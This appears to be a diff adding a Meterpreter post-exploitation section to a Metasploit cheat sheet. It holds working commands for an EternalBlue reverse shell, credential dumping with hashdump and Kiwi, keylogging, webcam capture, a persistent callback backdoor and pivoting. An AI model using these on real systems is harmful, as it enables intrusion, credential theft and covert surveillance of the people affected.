@@ -653,6 +653,7 @@ run
 ## SMB (Windows) Enumeration
 
 |Module |Purpose|
+|----|----|
 |auxiliary/scanner/smb/smb_version |Detect SMB version|
 |auxiliary/scanner/smb/smb_enumusers |Enumerate users|
 |auxiliary/scanner/smb/smb_enumshares |Enumerate shared folders|
@@ -741,6 +742,7 @@ run
 ## FTP Enumeration
 
 |Module| Purpose|
+|----|----|
 |auxiliary/scanner/ftp/ftp_version| Detect FTP version|
 |auxiliary/scanner/ftp/anonymous |Check for anonymous login|
 |auxiliary/scanner/ftp/ftp_login |Brute-force FTP|
@@ -860,3 +862,254 @@ run
 
 
 
+# 5. Post-Exploitation (Meterpreter)
+
+### What Is Meterpreter?
+
+Meterpreter is a **post-exploitation payload** that runs entirely in memory. It never touches the target's hard drive, making it stealthy and hard to detect. Once you have a Meterpreter session, you can:
+
+- Control the target system remotely
+- Upload and download files
+- Steal passwords and hashes
+- Take screenshots and record keystrokes
+- Pivot to other systems on the network
+- Escalate privileges
+
+---
+
+### Getting a Meterpreter Session
+
+You typically get Meterpreter by setting it as your payload in an exploit or `multi/handler`.
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+- When the exploit succeeds, you'll see:
+
+```text
+[*] Meterpreter session 1 opened
+msf6 exploit(ms17_010_eternalblue) > sessions -i 1
+meterpreter >
+```
+
+## Core Meterpreter Commands
+
+|Command |Purpose|
+|----|----|
+|help |Show all available commands|
+|background| Send session to background|
+|exit |Terminate the session|
+|sessions| List all active sessions (from msfconsole)|
+|sessions -i [ID] |Interact with a session (from msfconsole)|
+
+
+## System Information
+
+|Command |Purpose|
+|----|----|
+|sysinfo |Show target OS, computer name, architecture|
+|getuid |Show current user privileges|
+|getpid| Show current process ID|
+|ps| List all running processes|
+
+**Example:**
+
+```bash
+meterpreter > sysinfo
+Computer        : DESKTOP-ABC123
+OS              : Windows 10 (10.0 Build 19045)
+Architecture    : x64
+Meterpreter     : x64/windows
+```
+
+
+##  Process Management
+
+|Command |Purpose|
+|----|----|
+|ps| List all running processes|
+|migrate [PID] |Move Meterpreter to another process|
+|kill [PID] |Terminate a process|
+|execute -f [process] |Run a new process|
+
+- Why migrate? Moving to a more trusted process (like explorer.exe or svchost.exe) can hide your session and bypass firewall rules.
+
+- Example: Migrate to explorer.exe
+
+```bash
+meterpreter > ps | grep explorer
+2528   explorer.exe
+meterpreter > migrate 2528
+[*] Migrating to 2528...
+[*] Migration completed successfully
+```
+
+
+## File System Commands
+
+|Command |Purpose Linux |Alternative|
+|----|------|----|
+|pwd |Show current directory| pwd|
+|ls |List files |ls|
+|cd [dir] |Change directory |cd|
+|cat [file] |Display file contents| cat|
+|upload [local] [remote]| Upload file to target| upload|
+|download [remote] [local] |Download file from target |download|
+|search -f [filename] |Search for files| search|
+|rm [file] |Delete file| rm|
+|mkdir [dir] |Create directory| mkdir|
+|rmdir [dir] |Remove directory| rmdir|
+|edit [file] |Edit file (Vim-like) |edit|
+
+- Example: Search for sensitive files
+
+```bash
+meterpreter > search -f *.txt
+Found 15 results...
+```
+
+
+## Networking Commands
+
+|Command |Purpose|
+|----|----|
+|ipconfig / ifconfig |Show network interfaces|
+|netstat |Show active connections|
+|arp |Show ARP cache|
+|route |Show routing table|
+|getsystem |Attempt to elevate to SYSTEM|
+|portfwd add -l [local] -p [remote] -r [ip]| Forward a local port to remote|
+
+- Example: Port forwarding (pivoting)
+
+```bash
+meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.20
+[*] Local TCP relay created: :8080 -> 192.168.1.20:80
+```
+
+- Now you can access http://localhost:8080 on your machine to reach 192.168.1.20:80 through the compromised host.
+
+
+## Privilege Escalation
+
+|Command |Purpose|
+|----|----|
+|getsystem| Attempt to elevate to SYSTEM (Windows)|
+|getprivs |Show current privileges
+run| |post/multi/recon/local_exploit_suggester| Find local exploits for privilege escalation|
+
+- Example: Attempt privilege escalation
+
+```bash
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation)
+```
+
+- Example: Run exploit suggester
+
+```bash
+meterpreter > background
+msf6 > use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+
+## Credential Theft
+
+|Command |Purpose|
+|----|----|
+|hashdump Dump |Windows password hashes (SAM)|
+|kiwi |(formerly mimikatz) Extract plaintext passwords and hashes|
+|load kiwi| Load the Kiwi extension|
+|creds_all |Dump all credentials (after loading kiwi)|
+
+- Example: Dump hashes
+
+```bash
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+- Example: Extract plaintext passwords with Kiwi
+
+```bash
+meterpreter > load kiwi
+meterpreter > creds_all
+```
+
+
+## Screen Capture and Keylogging
+
+|Command |Purpose|
+|----|----|
+|screenshot |Take a screenshot of the target's desktop|
+|webcam_list| List available webcams|
+|webcam_snap |Take a picture from webcam|
+|keyscan_start |Start keylogger|
+|keyscan_dump |Dump captured keystrokes|
+|keyscan_stop |Stop keylogger|
+
+- Example: Keylogging
+
+```bash
+meterpreter > keyscan_start
+[*] Starting keylogger...
+meterpreter > keyscan_dump
+Dumped keystrokes:
+Password123<Return>
+```
+
+
+## Persistence
+
+|Command| Purpose|
+|----|----|
+|run persistence -h |Show persistence options|
+|run persistence -A -X -i 5 -p 4444 -r 192.168.1.5| Install persistent backdoor|
+
+- Example: Install persistence (Windows)
+
+```bash
+meterpreter > run persistence -A -X -i 5 -p 4444 -r 192.168.1.5
+[*] Installing persistent backdoor...
+```
+
+- The target will reconnect to your listener every 5 seconds, even after reboots.
+
+
+  
+## Pivoting (Lateral Movement)
+
+- **Once you have one compromised host, you can use it to access other hosts on its network.**
+
+- Step 1: Add a route through the compromised host
+
+```bash
+meterpreter > background
+msf6 > route add 192.168.2.0 255.255.255.0 1
+```
+
+- Step 2: Scan the new network through the pivot
+
+```bash
+msf6 > use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.2.0/24
+set PORTS 445
+run
+```
+
+
+## Useful Meterpreter Extensions
+
+|Extension |Command |Purpose|
+|----|----|----|
+|kiwi |load kiwi |Extract credentials (mimikatz)|
+|priv| load priv |Privilege escalation helpers|
+|incognito |load incognito |Token manipulation|
+|sniffer| load sniffer| Network sniffing|
+|stdapi| (loaded by default)| Core commands (filesystem, network)|
